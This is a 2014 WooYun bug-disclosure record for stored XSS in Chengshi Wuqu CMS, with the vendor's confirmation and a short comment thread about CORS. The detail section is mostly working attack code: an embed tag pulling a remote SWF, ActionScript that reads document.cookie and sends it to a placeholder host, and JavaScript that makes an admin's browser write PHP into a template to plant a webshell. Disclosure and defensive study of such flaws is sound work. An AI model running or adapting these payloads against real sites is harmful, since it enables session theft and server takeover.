{"id": 54644, "wybug_id": "wooyun-2014-063816", "wybug_title": "程氏舞曲CMS储存型 xss（5）", "wybug_corp": "chshcms.com", "wybug_author": "roker", "wybug_date": "2014-06-09 17:04", "wybug_open_date": "2014-09-07 17:06", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向公众公开  简要描述： rt，swf啊。。 详细说明：  上传视频处 。对于外部swf文件 过分信任\n\n可插入 如下代码<embed src=http://xxx.xxx/xss.swf type=\"application/x-shockwave-flash\" allowfullscreen=\"true\" allownetworking=\"all\" allowscriptaccess=\"always\">构造 恶意的 swf 执行 js像这样 alert\n\n\n\n这是 获取cookie的swf代码\npackage {\timport flash.external.ExternalInterface;\timport flash.display.Sprite;\timport flash.display.Sprite;    import flash.events.Event;    import flash.net.URLLoader;    import flash.net.URLRequest;    import flash.text.TextField;    import flash.text.TextFieldAutoSize;    import flash.xml.*;    import flash.events.IOErrorEvent;\timport flash.events.*;    import flash.net.*;\t/**\t * @author User\t */\t \tpublic class csrf extends Sprite {                private var loader:URLLoader;        public function csrf() {\t\t\tvar res:String = ExternalInterface.call(\"function(){return document.cookie;}\");            doGet(res);        }\t\t\t\tprivate function doGet(res:String):void{\t\t\tloader = new URLLoader();\t\t\tvar target:String = \"http://xxx/xxx.php?get=\"+res;            var request:URLRequest = new URLRequest(target);            try {                loader.load(request);            } catch (error:Error) {                sendDatatoJS(\"Error: \" + error.getStackTrace());            }\t\t}\t\t\t\tprivate function sendDatatoJS(data:String):void{            trace(data);\t\t\tExternalInterface.call(\"console.log\", data);\t\t}    }\t\t}\n后台可以getshellhttp://localhost/index.php/admin/skins/savepost如下数据 \npath=.%2Fskins%2Findex%2Fdefault%2Fhtml%2Fcs-404.php&CS_Name=cs-404&CS_Neir=<?php phpinfo();?>&Submit=+%E4%BF%AE%E6%94%B9+\ngetshell\n\n我们 可以 swf加载个 远程jsjs代码为\n﻿﻿﻿﻿﻿﻿var request = false; if(window.XMLHttpRequest) { request = new XMLHttpRequest(); if(request.overrideMimeType) { request.overrideMimeType('text/xml'); } } else if (window.ActiveXObject) { var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP']; for(var i=0; i<versions.length; i++) { try { request = new ActiveXObject(versions); } catch(e) {} } } xmlhttp=request; url = \"http://xxx.com/index.php/admin/skins/save\"; var params ='path=.%2Fskins%2Findex%2Fdefault%2Fhtml%2Fcs-404.php&CS_Name=cs-404&CS_Neir=<?php phpinfo();?>&Submit=+%E4%BF%AE%E6%94%B9+'; xmlhttp.open(\"POST\", url, true); xmlhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xmlhttp.setRequestHeader(\"Content-length\", params.length); xmlhttp.setRequestHeader(\"Connection\", \"Keep-Alive\"); xmlhttp.setRequestHeader(\"Accept\", \"text/html,application/xhtm+xml,application/xml;q=0.9,*/*;q=0.8\"); xmlhttp.withCredentials = \"true\"; xmlhttp.send(params);\n cors是可以跨域传输数据的。从而 后台审核视频文章时 getshell   漏洞证明：  如上所述   修复方案：  过滤 allowfullscreen=\"true\" allownetworking=\"all\" allowscriptaccess=\"always\"   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-09 18:51 厂商回复： 检查 漏洞确实存在，我们会立即修复~！感谢您的检测~！ 最新状态： 2014-06-10：已经修复~！  ", "replys": "漏洞评价：\n评论\n     2014-06-29 23:08 |    \t\tzj1244 \t\t\t( 普通白帽子  |\t\t\t        Rank:273 漏洞数:33        | 小葵)\t\t \n  cors要求目标域设置Access-Control-Allow-Origin，你这样跨域不成功吧？    \n     2014-06-30 03:12 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @zj1244 余弦大牛的 web前端黑客技术揭秘 一书中 2.5.2 ajax风险 中 写到“如果目标域不设置Access-Control-Allow-Origin: http://www.foo.com，那么隐私数据可以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被目标域的steal.php接收到了。默认情况下，这样的跨域无法带上目标域的会话（Cookies等），需要设置xhr实例的withCredentials属性为true（IE还不支持），。。。。。”更深成次的原理我也不懂，但是 实测是可行的。目标域可以接受数据。你可以自己测试下0.0..可以的话加个秋秋，求交流，求学习，求搞基~    \n     2014-06-30 09:47 |    \t\tzj1244 \t\t\t( 普通白帽子  |\t\t\t        Rank:273 漏洞数:33        | 小葵)\t\t \n  @roker 差点忘了这茬了，那时候我测试觉得挺奇怪的，目标域不设置Access-Control-Allow-Origin，用普通的ajax都可以提交数据成功。扣扣43416783，一起学习    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}